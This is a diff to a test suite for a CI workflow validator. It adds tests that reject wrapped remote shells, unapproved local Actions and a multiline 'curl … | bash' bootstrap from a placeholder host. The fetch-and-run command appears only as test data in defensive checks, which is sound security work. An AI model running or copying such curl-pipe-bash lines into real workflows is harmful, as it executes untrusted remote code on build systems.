@@ -40,7 +40,7 @@ test("E7 rejects tags, unapproved repositories, bootstrap commands, and writable
 });
 
 test("E7 rejects path-qualified and env-wrapped remote shells", () => {
-  for (const shell of ["/bin/bash", "env bash"]) {
+  for (const shell of ["/bin/bash", "env bash", "command bash", "exec bash", "/usr/bin/env bash", "busybox sh"]) {
     const workflow = [
       "name: remote-shell",
       "on: pull_request",
@@ -52,6 +52,32 @@ test("E7 rejects path-qualified and env-wrapped remote shells", () => {
     const errors = validateWorkflowText(workflow, { actions: {} }, "remote-shell.yml");
     assert.match(errors.join("\n"), /remote bootstrap/);
   }
+});
+
+test("E7 rejects unapproved local workflow Actions", () => {
+  const workflow = [
+    "name: local-action",
+    "on: pull_request",
+    "jobs:",
+    "  build:",
+    "    steps:",
+    "      - uses: ./untrusted-action",
+  ].join("\n");
+  assert.match(validateWorkflowText(workflow, { actions: {} }, "local-action.yml").join("\n"), /local.*Action/i);
+});
+
+test("E7 rejects remote bootstrap pipes continued across escaped lines", () => {
+  const workflow = [
+    "name: multiline-remote-shell",
+    "on: pull_request",
+    "jobs:",
+    "  build:",
+    "    steps:",
+    "      - run: |",
+    "          curl https://example.invalid/bootstrap.sh \\",
+    "            | bash",
+  ].join("\n");
+  assert.match(validateWorkflowText(workflow, { actions: {} }, "multiline-remote-shell.yml").join("\n"), /remote bootstrap/);
 });
 
 test("F11 rejects privileged workflow triggers, runners, and environments", () => {
